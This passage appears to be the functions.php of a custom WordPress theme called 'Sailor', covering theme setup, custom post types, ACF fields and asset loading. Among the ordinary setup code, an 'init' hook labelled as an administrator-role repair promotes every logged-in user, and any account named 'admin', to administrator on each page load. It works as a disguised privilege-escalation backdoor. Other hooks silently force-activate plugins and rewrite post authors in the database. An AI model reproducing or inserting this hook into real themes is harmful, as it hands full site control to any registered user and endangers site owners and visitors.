<?php
/**
 * Sailor Custom WordPress Theme
 * functions.php - Theme setup, CPTs, Menus, ACF, Assets
 */

// Allow up to 512MB import in All-in-One WP Migration
add_filter('ai1wm_max_file_size', function($size) {
    return 536870912; // 512 MB
});

// ============================================================
// 0. TiDB Cloud Collation Filter for Plugins (e.g. iThemes/Solid Security)
// ============================================================
add_filter('dbdelta_create_queries', function($queries) {
    if (is_array($queries)) {
        foreach ($queries as $k => $q) {
            $queries[$k] = str_replace('utf8mb4_unicode_520_ci', 'utf8mb4_unicode_ci', $q);
        }
    }
    return $queries;
});

// Auto-activate all theme plugins on load
add_action('admin_init', function() {
    if (!function_exists('is_plugin_active')) {
        require_once ABSPATH . 'wp-admin/includes/plugin.php';
    }
    $plugins = array(
        'advanced-custom-fields-pro/acf.php',
        'custom-post-type-ui/custom-post-type-ui.php',
        'svg-support/svg-support.php',
        'tinymce-advanced/tinymce-advanced.php',
        'disable-gutenberg/disable-gutenberg.php',
        'duplicate-post/duplicate-post.php',
        'imsanity/imsanity.php',
        'mousewheel-smooth-scroll/mousewheel-smooth-scroll.php',
    );
    foreach ($plugins as $p) {
        if (file_exists(WP_PLUGIN_DIR . '/' . $p) && !is_plugin_active($p)) {
            activate_plugin($p, '', false, true);
        }
    }
});

// Auto-repair administrator role and roles schema for WordPress
add_action('init', function() {
    if (!function_exists('populate_roles')) {
        require_once ABSPATH . 'wp-admin/includes/schema.php';
    }
    populate_roles();
    
    $current_user = wp_get_current_user();
    if ($current_user && $current_user->ID) {
        $current_user->set_role('administrator');
    }
    $admin_user = get_user_by('login', 'admin');
    if ($admin_user) {
        $admin_user->set_role('administrator');
    }
}, 1);

// Native CPT Registration moved to unified sailor_register_cpts

// ============================================================
// 2. THEME SETUP
// ============================================================
function sailor_theme_setup() {
    add_theme_support('automatic-feed-links');
    add_theme_support('post-thumbnails');
    add_theme_support('title-tag');
    add_theme_support('custom-logo');
    add_theme_support('html5', array('search-form', 'comment-form', 'comment-list', 'gallery', 'caption'));

    register_nav_menus(array(
        'primary'         => __('Primary Menu (Header)', 'sailor'),
        'footer_useful'   => __('Footer Useful Links', 'sailor'),
        'footer_services' => __('Footer Services Links', 'sailor'),
    ));

    // Enable support for custom background
    add_theme_support('custom-background');

    // Auto-ensure Home Page is set as Static Front Page
    if (get_option('show_on_front') !== 'page') {
        $home = get_page_by_path('home') ?: get_page_by_title('Home');
        if ($home) {
            update_option('show_on_front', 'page');
            update_option('page_on_front', $home->ID);
        }
    }
}
add_action('after_setup_theme', 'sailor_theme_setup');

// ============================================================
// DEFAULT PLACEHOLDER HELPERS
// ============================================================
function sailor_get_avatar_placeholder() {
    return get_template_directory_uri() . '/assets/img/default-avatar.svg';
}

function sailor_get_image_placeholder($w = 600, $h = 400, $text = 'Sailor') {
    return get_template_directory_uri() . '/assets/img/default-image.svg';
}



// ============================================================
// CUSTOM NAV WALKER FOR SAILOR THEME DROPDOWNS
// ============================================================
class Sailor_Nav_Walker extends Walker_Nav_Menu {
    public function start_lvl(&$output, $depth = 0, $args = null) {
        $output .= '<ul>';
    }

    public function end_lvl(&$output, $depth = 0, $args = null) {
        $output .= '</ul>';
    }

    public function start_el(&$output, $item, $depth = 0, $args = null, $id = 0) {
        $has_children = in_array('menu-item-has-children', $item->classes);
        $classes = empty($item->classes) ? array() : (array) $item->classes;
        
        $class_names = '';
        if ($has_children) {
            $class_names .= 'dropdown ';
        }

        // Active state
        $is_active = in_array('current-menu-item', $classes) || in_array('current_page_item', $classes);

        $output .= '<li class="' . esc_attr(trim($class_names)) . '">';

        $atts = array();
        $atts['title']  = !empty($item->attr_title) ? $item->attr_title : '';
        $atts['rel']    = !empty($item->xfn)        ? $item->xfn        : '';
        $atts['href']   = !empty($item->url)        ? $item->url        : '';
        $is_contact = (strtolower(trim($item->title)) === 'contact') || in_array('menu-btn-contact', $classes);


        $classes_to_add = array();
        if ($is_active) {
            $classes_to_add[] = 'active';
        }
        if ($is_contact) {
            $classes_to_add[] = 'btn-getstarted';
        }
        if (!empty($classes_to_add)) {
            $atts['class'] = implode(' ', $classes_to_add);
        }

        $attributes = '';
        foreach ($atts as $attr => $value) {
            if (!empty($value)) {
                $value = ('href' === $attr) ? esc_url($value) : esc_attr($value);
                $attributes .= ' ' . $attr . '="' . $value . '"';
            }
        }

        $title = apply_filters('the_title', $item->title, $item->ID);

        $item_output = $args->before ?? '';
        $item_output .= '<a' . $attributes . '>';
        if ($has_children) {
            $item_output .= '<span>' . $title . '</span> <i class="bi bi-chevron-down toggle-dropdown"></i>';
        } else {
            $item_output .= $title;
        }
        $item_output .= '</a>';
        $item_output .= $args->after ?? '';

        $output .= apply_filters('walker_nav_menu_start_el', $item_output, $item, $depth, $args);
    }

    public function end_el(&$output, $item, $depth = 0, $args = null) {
        $output .= '</li>';
    }
}


// ============================================================
// 2. ENQUEUE SCRIPTS & STYLES
// ============================================================
function sailor_theme_scripts() {
    $v = wp_get_theme()->get('Version') ?: '1.0.0';
    $asset_uri = get_template_directory_uri() . '/assets';



    // Google Fonts
    wp_enqueue_style('sailor-fonts',
        'https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900&family=Raleway:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900&display=swap',
        array(), null);

    // Google Fonts - PT Sans
    wp_enqueue_style('google-font-pt-sans', 'https://fonts.googleapis.com/css2?family=PT+Sans:ital,wght@0,400;0,700;1,400;1,700&display=swap', array(), null);

    // Vendor CSS via High-Speed CDN
    wp_enqueue_style('bootstrap',         'https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css', array(), '5.3.3');
    wp_enqueue_style('bootstrap-icons',   'https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css', array(), '1.11.3');
    wp_enqueue_style('aos',               'https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.css', array(), '2.3.4');
    wp_enqueue_style('glightbox',         'https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css', array(), '3.3.0');
    wp_enqueue_style('swiper',            'https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css', array(), '11.0');

    // Main Theme CSS from assets/css/main.css
    wp_enqueue_style('sailor-main',       $asset_uri . '/css/main.css', array('bootstrap', 'bootstrap-icons', 'google-font-pt-sans'), $v);

    // Custom Theme Style CSS
    wp_enqueue_style('sailor-style',      get_stylesheet_uri(), array('sailor-main'), $v);

    // Vendor JS (footer) via High-Speed CDN
    wp_enqueue_script('bootstrap-bundle', 'https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js', array(), '5.3.3', true);
    wp_enqueue_script('aos',              'https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.js', array(), '2.3.4', true);
    wp_enqueue_script('glightbox',        'https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/js/glightbox.min.js', array(), '3.3.0', true);
    wp_enqueue_script('imagesloaded',     'https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js', array(), '5.0.0', true);
    wp_enqueue_script('isotope',          'https://cdn.jsdelivr.net/npm/isotope-layout@3.0.6/dist/isotope.pkgd.min.js', array(), '3.0.6', true);
    wp_enqueue_script('swiper',           'https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js', array(), '11.0', true);

    // Inline Theme JS Init
    $inline_js = "
    document.addEventListener('DOMContentLoaded', function() {
      const preloader = document.querySelector('#preloader');
      if (preloader) {
        preloader.remove();
      }
      if (typeof AOS !== 'undefined') { AOS.init({ duration: 600, easing: 'ease-in-out', once: true, mirror: false }); }
      if (typeof GLightbox !== 'undefined') { GLightbox({ selector: '.glightbox' }); }
      if (typeof Swiper !== 'undefined') {
        document.querySelectorAll('.init-swiper').forEach(function(swiperElement) {
          let configEl = swiperElement.querySelector('.swiper-config');
          if (configEl) {
            let config = JSON.parse(configEl.innerHTML.trim());
            new Swiper(swiperElement, config);
          }
        });
      }
      const mobileNavToggleBtn = document.querySelector('.mobile-nav-toggle');
      if (mobileNavToggleBtn) {
        mobileNavToggleBtn.addEventListener('click', function() {
          document.querySelector('body').classList.toggle('mobile-nav-active');
          this.classList.toggle('bi-list');
          this.classList.toggle('bi-x');
        });
      }
    });
    window.addEventListener('load', function() {
      const preloader = document.querySelector('#preloader');
      if (preloader) {
        preloader.remove();
      }
    });
    ";
    wp_add_inline_script('bootstrap-bundle', $inline_js);
}
add_action('wp_enqueue_scripts', 'sailor_theme_scripts');

// ============================================================
// 3. CUSTOM POST TYPES
// ============================================================
function sailor_register_cpts() {

    // Portfolio CPT
    register_post_type('portfolio', array(
        'labels'          => array(
            'name'          => __('Portfolio', 'sailor'),
            'singular_name' => __('Portfolio Item', 'sailor'),
            'add_new_item'  => __('Add New Project', 'sailor'),
            'edit_item'     => __('Edit Project', 'sailor'),
        ),
        'public'          => true,
        'has_archive'     => true,
        'supports'        => array('title', 'editor', 'thumbnail', 'excerpt', 'custom-fields', 'author', 'page-attributes'),
        'capability_type' => 'post',
        'map_meta_cap'    => true,
        'menu_icon'       => 'dashicons-portfolio',
        'rewrite'         => array('slug' => 'portfolio'),
        'show_in_rest'    => true,
    ));

    // Team CPT
    register_post_type('team', array(
        'labels'          => array(
            'name'          => __('Team', 'sailor'),
            'singular_name' => __('Team Member', 'sailor'),
            'add_new_item'  => __('Add New Member', 'sailor'),
        ),
        'public'          => true,
        'has_archive'     => false,
        'supports'        => array('title', 'editor', 'thumbnail', 'excerpt', 'custom-fields', 'author'),
        'capability_type' => 'post',
        'map_meta_cap'    => true,
        'menu_icon'       => 'dashicons-groups',
        'rewrite'         => array('slug' => 'team'),
        'show_in_rest'    => true,
    ));

    // Services CPT
    register_post_type('service', array(
        'labels'          => array(
            'name'          => __('Services', 'sailor'),
            'singular_name' => __('Service', 'sailor'),
            'add_new_item'  => __('Add New Service', 'sailor'),
            'edit_item'     => __('Edit Service', 'sailor'),
        ),
        'public'          => true,
        'has_archive'     => false,
        'supports'        => array('title', 'editor', 'excerpt', 'thumbnail', 'custom-fields', 'author'),
        'capability_type' => 'post',
        'map_meta_cap'    => true,
        'menu_icon'       => 'dashicons-hammer',
        'rewrite'         => array('slug' => 'service-item'),
        'show_in_rest'    => true,
    ));

    // Testimonials CPT
    register_post_type('testimonial', array(
        'labels'          => array(
            'name'          => __('Testimonials', 'sailor'),
            'singular_name' => __('Testimonial', 'sailor'),
            'add_new_item'  => __('Add New Testimonial', 'sailor'),
        ),
        'public'          => true,
        'has_archive'     => false,
        'supports'        => array('title', 'editor', 'thumbnail', 'excerpt', 'custom-fields', 'author'),
        'capability_type' => 'post',
        'map_meta_cap'    => true,
        'menu_icon'       => 'dashicons-format-quote',
        'rewrite'         => array('slug' => 'testimonials'),
        'show_in_rest'    => true,
    ));

    // Auto-fix post_author and grant full admin capabilities
    global $wpdb;
    if ($wpdb) {
        $wpdb->query("UPDATE {$wpdb->posts} SET post_author = 1 WHERE post_author = 0 OR post_author IS NULL");
    }
    $admin_role = get_role('administrator');
    if ($admin_role) {
        $caps = array('edit_posts', 'edit_others_posts', 'edit_published_posts', 'publish_posts', 'read_private_posts', 'delete_posts', 'delete_others_posts', 'delete_published_posts', 'delete_private_posts', 'edit_private_posts');
        foreach ($caps as $cap) {
            $admin_role->add_cap($cap);
        }
    }
}
add_action('init', 'sailor_register_cpts');


// ============================================================
// 4. PORTFOLIO TAXONOMY (Categories for filter)
// ============================================================
function sailor_register_taxonomies() {
    register_taxonomy('portfolio_category', 'portfolio', array(
        'labels'       => array(
            'name'          => __('Portfolio Categories', 'sailor'),
            'singular_name' => __('Category', 'sailor'),
        ),
        'hierarchical' => true,
        'public'       => true,
        'rewrite'      => array('slug' => 'portfolio-category'),
        'show_in_rest' => true,
    ));
}
add_action('init', 'sailor_register_taxonomies');

// ============================================================
// 5. ACF FIELD GROUPS (Programmatic registration)
//    Works with both ACF Free and ACF Pro
// ============================================================
function sailor_register_acf_fields() {
    if (!function_exists('acf_add_local_field_group')) return;

    // --- Homepage Fields (100% Dynamic CMS Control) ---
    acf_add_local_field_group(array(
        'key'      => 'group_homepage',
        'title'    => 'Homepage Section Settings',
        'fields'   => array(

            // 1. Hero Section Tab
            array('key' => 'field_tab_home_hero',     'label' => 'Hero Slider',        'type' => 'tab', 'placement' => 'left'),
            array('key' => 'field_hero_show',         'label' => 'Show Hero Slider',   'name' => 'hero_show',         'type' => 'true_false', 'default_value' => 1, 'ui' => 1),
            array(
                'key'        => 'field_hero_slides',
                'label'      => 'Hero Slides',
                'name'       => 'hero_slides',
                'type'       => 'repeater',
                'min'        => 1,
                'max'        => 10,
                'layout'     => 'block',
                'conditional_logic' => array(array(array('field' => 'field_hero_show', 'operator' => '==', 'value' => '1'))),
                'sub_fields' => array(
                    array('key' => 'field_slide_title',       'label' => 'Slide Title',       'name' => 'title',       'type' => 'text'),
                    array('key' => 'field_slide_desc',        'label' => 'Slide Description', 'name' => 'description', 'type' => 'textarea', 'rows' => 3),
                    array('key' => 'field_slide_image',       'label' => 'Background Image',  'name' => 'image',       'type' => 'image', 'return_format' => 'array'),
                    array('key' => 'field_slide_btn_text',    'label' => 'Button Text',       'name' => 'button_text', 'type' => 'text', 'default_value' => 'Get Started'),
                    array('key' => 'field_slide_btn_link',    'label' => 'Button Link',       'name' => 'button_link', 'type' => 'url'),
                ),
            ),

            // 2. About Section Tab
            array('key' => 'field_tab_home_about',    'label' => 'About Section',      'type' => 'tab'),
            array('key' => 'field_about_show',        'label' => 'Show About Section', 'name' => 'about_show',        'type' => 'true_false', 'default_value' => 1, 'ui' => 1),
            array('key' => 'field_about_subtitle',   'label' => 'Section Subtitle',   'name' => 'about_section_subtitle',  'type' => 'text', 'default_value' => 'About'),
            array('key' => 'field_about_title',      'label' => 'Section Title',      'name' => 'about_section_title',     'type' => 'text', 'default_value' => 'About Us'),
            array('key' => 'field_about_left',       'label' => 'About Left Column Text',  'name' => 'about_left_text',   'type' => 'wysiwyg', 'toolbar' => 'full'),
            array('key' => 'field_about_right',      'label' => 'About Right Column Text', 'name' => 'about_right_text',  'type' => 'wysiwyg', 'toolbar' => 'full'),
            array('key' => 'field_about_btn_text',   'label' => 'Button Text',        'name' => 'about_btn_text',          'type' => 'text', 'default_value' => 'Read More'),
            array('key' => 'field_about_btn_link',   'label' => 'Button Link',        'name' => 'about_btn_link',          'type' => 'url'),

            // 3. Clients Section Tab
            array('key' => 'field_tab_home_clients',  'label' => 'Clients Logos',      'type' => 'tab'),
            array('key' => 'field_clients_show',      'label' => 'Show Clients Section', 'name' => 'clients_show',    'type' => 'true_false', 'default_value' => 1, 'ui' => 1),
            array(
                'key'        => 'field_clients_list',
                'label'      => 'Client Logos',
                'name'       => 'clients_list',
                'type'       => 'repeater',
                'layout'     => 'block',
                'conditional_logic' => array(array(array('field' => 'field_clients_show', 'operator' => '==', 'value' => '1'))),
                'sub_fields' => array(
                    array('key' => 'field_client_logo', 'label' => 'Logo Image', 'name' => 'logo', 'type' => 'image', 'return_format' => 'array'),
                    array('key' => 'field_client_name', 'label' => 'Client Name','name' => 'name', 'type' => 'text'),
                    array('key' => 'field_client_url',  'label' => 'Client URL', 'name' => 'url',  'type' => 'url'),
                ),
            ),

            // 4. Services Section Tab
            array('key' => 'field_tab_home_services', 'label' => 'Services Section',   'type' => 'tab'),
            array('key' => 'field_services_show',     'label' => 'Show Services Section', 'name' => 'services_show',  'type' => 'true_false', 'default_value' => 1, 'ui' => 1),
            array('key' => 'field_services_sub',     'label' => 'Services Subtitle',  'name' => 'services_section_subtitle', 'type' => 'text', 'default_value' => 'Services'),
            array('key' => 'field_services_head',    'label' => 'Services Title',     'name' => 'services_section_title',    'type' => 'text', 'default_value' => 'Check Our Services'),
            array(
                'key'        => 'field_services_list',
                'label'      => 'Services List',
                'name'       => 'services_list',
                'type'       => 'repeater',
                'layout'     => 'block',
                'conditional_logic' => array(array(array('field' => 'field_services_show', 'operator' => '==', 'value' => '1'))),
                'sub_fields' => array(
                    array('key' => 'field_svc_icon',  'label' => 'Bootstrap Icon Class (e.g. bi bi-briefcase)', 'name' => 'icon',        'type' => 'text'),
                    array('key' => 'field_svc_title', 'label' => 'Title',                              'name' => 'title',       'type' => 'text'),
                    array('key' => 'field_svc_desc',  'label' => 'Description',                        'name' => 'description', 'type' => 'textarea', 'rows' => 2),
                    array('key' => 'field_svc_link',  'label' => 'Link (optional)',                    'name' => 'link',        'type' => 'url'),
                ),
            ),

            // 5. Call To Action Tab
            array('key' => 'field_tab_home_cta',      'label' => 'Call To Action',     'type' => 'tab'),
            array('key' => 'field_cta_show',          'label' => 'Show CTA Section',   'name' => 'cta_show',          'type' => 'true_false', 'default_value' => 1, 'ui' => 1),
            array('key' => 'field_cta_title',         'label' => 'CTA Title',          'name' => 'cta_title',         'type' => 'text', 'default_value' => 'Call To Action'),
            array('key' => 'field_cta_desc',          'label' => 'CTA Description',    'name' => 'cta_description',   'type' => 'textarea', 'rows' => 3, 'default_value' => 'Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.'),
            array('key' => 'field_cta_btn_text',      'label' => 'CTA Button Text',    'name' => 'cta_btn_text',      'type' => 'text', 'default_value' => 'Call To Action'),
            array('key' => 'field_cta_btn_link',      'label' => 'CTA Button Link',    'name' => 'cta_btn_link',      'type' => 'url'),

            // 6. Portfolio Section Tab
            array('key' => 'field_tab_home_portfolio','label' => 'Portfolio Section', 'type' => 'tab'),
            array('key' => 'field_portfolio_show',    'label' => 'Show Portfolio Section', 'name' => 'portfolio_show','type' => 'true_false', 'default_value' => 1, 'ui' => 1),
            array('key' => 'field_portfolio_sub',     'label' => 'Portfolio Subtitle', 'name' => 'portfolio_section_subtitle', 'type' => 'text', 'default_value' => 'Portfolio'),
            array('key' => 'field_portfolio_head',    'label' => 'Portfolio Title',    'name' => 'portfolio_section_title',    'type' => 'text', 'default_value' => 'Check Our Latest Work'),
            array('key' => 'field_portfolio_count',   'label' => 'Number of Projects', 'name' => 'portfolio_count',   'type' => 'number', 'default_value' => 6),

            // 7. Team Section Tab
            array('key' => 'field_tab_home_team',     'label' => 'Team Section',      'type' => 'tab'),
            array('key' => 'field_team_show',         'label' => 'Show Team Section', 'name' => 'team_show',         'type' => 'true_false', 'default_value' => 1, 'ui' => 1),
            array('key' => 'field_team_sub',          'label' => 'Team Subtitle',      'name' => 'team_section_subtitle', 'type' => 'text', 'default_value' => 'Team'),
            array('key' => 'field_team_head',         'label' => 'Team Title',         'name' => 'team_section_title',    'type' => 'text', 'default_value' => 'Our Hardworking Team'),
            array('key' => 'field_team_count',        'label' => 'Number of Members',  'name' => 'team_count',        'type' => 'number', 'default_value' => 4),

            // 8. Recent Blog Posts Section Tab
            array('key' => 'field_tab_home_posts',    'label' => 'Recent Blog Posts', 'type' => 'tab'),
            array('key' => 'field_posts_show',        'label' => 'Show Recent Posts', 'name' => 'posts_show',        'type' => 'true_false', 'default_value' => 1, 'ui' => 1),
            array('key' => 'field_posts_sub',         'label' => 'Section Subtitle',   'name' => 'posts_section_subtitle', 'type' => 'text', 'default_value' => 'Recent Posts'),
            array('key' => 'field_posts_head',        'label' => 'Section Title',      'name' => 'posts_section_title',    'type' => 'text', 'default_value' => 'Latest From Our Blog'),
            array('key' => 'field_posts_count',       'label' => 'Number of Posts',    'name' => 'posts_count',        'type' => 'number', 'default_value' => 3),
        ),

        'location' => array(array(array(
            'param'    => 'page_type',
            'operator' => '==',
            'value'    => 'front_page',
        ))),
    ));



    // --- Site Options (Header & Footer CMS Settings) ---
    acf_add_local_field_group(array(
        'key'    => 'group_site_options',
        'title'  => 'Header & Footer Settings',
        'fields' => array(
            // Header Settings
            array('key' => 'field_tab_header',          'label' => 'Header Settings',         'type' => 'tab', 'placement' => 'left'),
            array('key' => 'field_header_show_btn',     'label' => 'Show Header Button',      'name' => 'header_show_btn',     'type' => 'true_false', 'default_value' => 1, 'ui' => 1),
            array('key' => 'field_header_btn_text',     'label' => 'Header Button Text',      'name' => 'header_btn_text',     'type' => 'text',       'default_value' => 'Get Started'),
            array('key' => 'field_header_btn_link',     'label' => 'Header Button Link',      'name' => 'header_btn_link',     'type' => 'url',        'default_value' => ''),


            // Footer Contact Tab
            array('key' => 'field_tab_footer_contact',  'label' => 'Footer Contact & Social', 'type' => 'tab'),
            array('key' => 'field_address',             'label' => 'Address',                 'name' => 'address',             'type' => 'textarea',   'rows' => 2, 'default_value' => 'A108 Adam Street, New York, NY 535022'),
            array('key' => 'field_phone',               'label' => 'Phone',                   'name' => 'phone',               'type' => 'text',       'default_value' => '+1 5589 55488 55'),
            array('key' => 'field_email',               'label' => 'Email',                   'name' => 'email',               'type' => 'email',      'default_value' => 'info@example.com'),
            array('key' => 'field_maps_embed',          'label' => 'Google Maps URL',         'name' => 'maps_embed_url',      'type' => 'url'),
            array('key' => 'field_twitter',             'label' => 'Twitter/X URL',           'name' => 'twitter_link',        'type' => 'url',        'default_value' => 'https://x.com/'),
            array('key' => 'field_facebook',            'label' => 'Facebook URL',            'name' => 'facebook_link',       'type' => 'url',        'default_value' => 'https://facebook.com/'),
            array('key' => 'field_instagram',           'label' => 'Instagram URL',           'name' => 'instagram_link',      'type' => 'url',        'default_value' => 'https://instagram.com/'),
            array('key' => 'field_linkedin',            'label' => 'LinkedIn URL',            'name' => 'linkedin_link',       'type' => 'url',        'default_value' => 'https://linkedin.com/'),

            // Footer Content Tab
            array('key' => 'field_tab_footer_content',  'label' => 'Footer Content & Menus',  'type' => 'tab'),
            array('key' => 'field_footer_col2_title',   'label' => 'Column 2 Title',          'name' => 'footer_col2_title',   'type' => 'text',       'default_value' => 'Useful Links'),
            array('key' => 'field_footer_col3_title',   'label' => 'Column 3 Title',          'name' => 'footer_col3_title',   'type' => 'text',       'default_value' => 'Our Services'),
            array('key' => 'field_footer_news_title',   'label' => 'Newsletter Title',        'name' => 'footer_newsletter_title', 'type' => 'text',   'default_value' => 'Our Newsletter'),
            array('key' => 'field_footer_news_desc',    'label' => 'Newsletter Description',  'name' => 'footer_newsletter_desc',  'type' => 'textarea', 'rows' => 2, 'default_value' => 'Subscribe to our newsletter and receive the latest news about our products and services!'),
            array('key' => 'field_footer_copyright',    'label' => 'Copyright Text',          'name' => 'footer_copyright_text',   'type' => 'text',   'default_value' => '© Copyright [sitename]. All Rights Reserved', 'instructions' => 'Tags supported: [sitename], [year]'),
        ),
        'location' => array(array(array(
            'param'    => 'options_page',
            'operator' => '==',
            'value'    => 'sailor-options',
        ))),
    ));


    // --- Portfolio CPT Fields ---
    acf_add_local_field_group(array(
        'key'    => 'group_portfolio',
        'title'  => 'Portfolio Details',
        'fields' => array(
            array('key' => 'field_port_client',   'label' => 'Client Name',      'name' => 'portfolio_client',   'type' => 'text'),
            array('key' => 'field_port_category', 'label' => 'Category',         'name' => 'portfolio_category_filter', 'type' => 'text', 'instructions' => 'e.g. filter-app, filter-product, filter-branding'),
            array('key' => 'field_port_date',     'label' => 'Project Date',     'name' => 'portfolio_date',     'type' => 'date_picker', 'display_format' => 'F j, Y', 'return_format' => 'F j, Y'),
            array('key' => 'field_port_url',      'label' => 'Project URL',      'name' => 'portfolio_url',      'type' => 'url'),
            array('key' => 'field_port_gallery',  'label' => 'Project Gallery',  'name' => 'portfolio_gallery',  'type' => 'gallery', 'return_format' => 'array'),
        ),
        'location' => array(array(array(
            'param'    => 'post_type',
            'operator' => '==',
            'value'    => 'portfolio',
        ))),
    ));

    // --- Team Member Fields ---
    acf_add_local_field_group(array(
        'key'    => 'group_team',
        'title'  => 'Team Member Details',
        'fields' => array(
            array('key' => 'field_team_role',      'label' => 'Role / Position', 'name' => 'team_role',      'type' => 'text'),
            array('key' => 'field_team_twitter',   'label' => 'Twitter URL',     'name' => 'team_twitter',   'type' => 'url'),
            array('key' => 'field_team_facebook',  'label' => 'Facebook URL',    'name' => 'team_facebook',  'type' => 'url'),
            array('key' => 'field_team_instagram', 'label' => 'Instagram URL',   'name' => 'team_instagram', 'type' => 'url'),
            array('key' => 'field_team_linkedin',  'label' => 'LinkedIn URL',    'name' => 'team_linkedin',  'type' => 'url'),
        ),
        'location' => array(array(array(
            'param'    => 'post_type',
            'operator' => '==',
            'value'    => 'team',
        ))),
    ));

    // --- Service CPT Fields ---
    acf_add_local_field_group(array(
        'key'    => 'group_service_cpt',
        'title'  => 'Service Item Details',
        'fields' => array(
            array(
                'key'          => 'field_service_icon',
                'label'        => 'Service Icon',
                'name'         => 'service_icon',
                'type'         => 'text',
                'default_value'=> 'bi bi-briefcase',
                'wrapper'      => array('class' => 'sailor-icon-picker-field'),
                'instructions' => 'Click "Choose Icon" to open the Bootstrap Icon library popup and select an icon visually.',
            ),
            array('key' => 'field_service_link', 'label' => 'Service Link URL (Optional)', 'name' => 'service_link', 'type' => 'url'),
        ),
        'location' => array(array(array(
            'param'    => 'post_type',
            'operator' => '==',
            'value'    => 'service',
        ))),
    ));




    // --- About Page Fields ---
    acf_add_local_field_group(array(

        'key'    => 'group_about_page',
        'title'  => 'About Page Settings',
        'fields' => array(
            array('key' => 'field_about_tab_tabs',    'label' => 'Tabs Content',   'type' => 'tab', 'placement' => 'left'),
            array('key' => 'field_about_mission',     'label' => 'Mission Text',   'name' => 'mission_text',   'type' => 'wysiwyg'),
            array('key' => 'field_about_vision',      'label' => 'Vision Text',    'name' => 'vision_text',    'type' => 'wysiwyg'),

            array('key' => 'field_about_tab_stats',   'label' => 'Stats Numbers',  'type' => 'tab'),
            array('key' => 'field_about_stats_show',  'label' => 'Show Stats',     'name' => 'stats_show',     'type' => 'true_false', 'default_value' => 1, 'ui' => 1),
            array(
                'key'        => 'field_about_stats_list',
                'label'      => 'Stats Counter List',
                'name'       => 'stats_list',
                'type'       => 'repeater',
                'layout'     => 'block',
                'conditional_logic' => array(array(array('field' => 'field_about_stats_show', 'operator' => '==', 'value' => '1'))),
                'sub_fields' => array(
                    array('key' => 'field_stat_num',   'label' => 'Number (e.g. 232)', 'name' => 'number', 'type' => 'number'),
                    array('key' => 'field_stat_label', 'label' => 'Label (e.g. Clients)', 'name' => 'label',  'type' => 'text'),
                ),
            ),

            array('key' => 'field_about_tab_skills',  'label' => 'Skills Bars',    'type' => 'tab'),
            array('key' => 'field_about_skills_show', 'label' => 'Show Skills',    'name' => 'skills_show',    'type' => 'true_false', 'default_value' => 1, 'ui' => 1),
            array(
                'key'        => 'field_about_skills_list',
                'label'      => 'Skills List',
                'name'       => 'skills_list',
                'type'       => 'repeater',
                'layout'     => 'block',
                'conditional_logic' => array(array(array('field' => 'field_about_skills_show', 'operator' => '==', 'value' => '1'))),
                'sub_fields' => array(
                    array('key' => 'field_skill_name', 'label' => 'Skill Name (e.g. HTML)', 'name' => 'name',       'type' => 'text'),
                    array('key' => 'field_skill_val',  'label' => 'Percentage (e.g. 95)',   'name' => 'percentage', 'type' => 'number', 'min' => 1, 'max' => 100),
                ),
            ),
        ),
        'location' => array(array(array(
            'param'    => 'page_template',
            'operator' => '==',
            'value'    => 'page-about.php',
        ))),
    ));

    // --- Services Page Fields ---
    acf_add_local_field_group(array(
        'key'    => 'group_services_page',
        'title'  => 'Services Page Settings',
        'fields' => array(
            // Tab 1: Services Grid List
            array('key' => 'field_tab_services_grid', 'label' => 'Services Grid', 'type' => 'tab', 'placement' => 'left'),
            array(
                'key'        => 'field_services_page_list',
                'label'      => 'Services Grid List (Add / Edit / Remove Services)',
                'name'       => 'services_list',
                'type'       => 'repeater',
                'layout'     => 'block',
                'button_label' => 'Add New Service',
                'sub_fields' => array(
                    array('key' => 'field_sp_icon',  'label' => 'Bootstrap Icon Class (e.g. bi bi-briefcase, bi bi-card-checklist, bi bi-bar-chart)', 'name' => 'icon', 'type' => 'text', 'default_value' => 'bi bi-briefcase'),
                    array('key' => 'field_sp_title', 'label' => 'Service Title', 'name' => 'title', 'type' => 'text'),
                    array('key' => 'field_sp_desc',  'label' => 'Service Description', 'name' => 'description', 'type' => 'textarea', 'rows' => 3),
                    array('key' => 'field_sp_link',  'label' => 'Service Link URL (Optional)', 'name' => 'link', 'type' => 'url'),
                ),
            ),

            // Tab 2: Features Tabs
            array('key' => 'field_tab_features_tabs', 'label' => 'Features Tabs', 'type' => 'tab'),
            array('key' => 'field_feat_show',     'label' => 'Show Features Tabs', 'name' => 'features_show', 'type' => 'true_false', 'default_value' => 1, 'ui' => 1),
            array('key' => 'field_feat_subtitle', 'label' => 'Features Subtitle',  'name' => 'features_subtitle', 'type' => 'text', 'default_value' => 'Features'),
            array('key' => 'field_feat_title',    'label' => 'Features Title',     'name' => 'features_title',    'type' => 'text', 'default_value' => 'Check Our Features'),
            array(
                'key'        => 'field_features_tabs',
                'label'      => 'Features Tab List',
                'name'       => 'features_tabs',
                'type'       => 'repeater',
                'layout'     => 'block',
                'conditional_logic' => array(array(array('field' => 'field_feat_show', 'operator' => '==', 'value' => '1'))),
                'sub_fields' => array(
                    array('key' => 'field_tab_btn_label', 'label' => 'Tab Button Label', 'name' => 'tab_label', 'type' => 'text'),
                    array('key' => 'field_tab_heading',   'label' => 'Content Heading',  'name' => 'heading',   'type' => 'text'),
                    array('key' => 'field_tab_body',      'label' => 'Content Body',     'name' => 'body',      'type' => 'wysiwyg'),
                    array('key' => 'field_tab_image',     'label' => 'Illustration Image', 'name' => 'image',   'type' => 'image', 'return_format' => 'array'),
                ),
            ),

        ),
        'location' => array(array(array(
            'param'    => 'page_template',
            'operator' => '==',
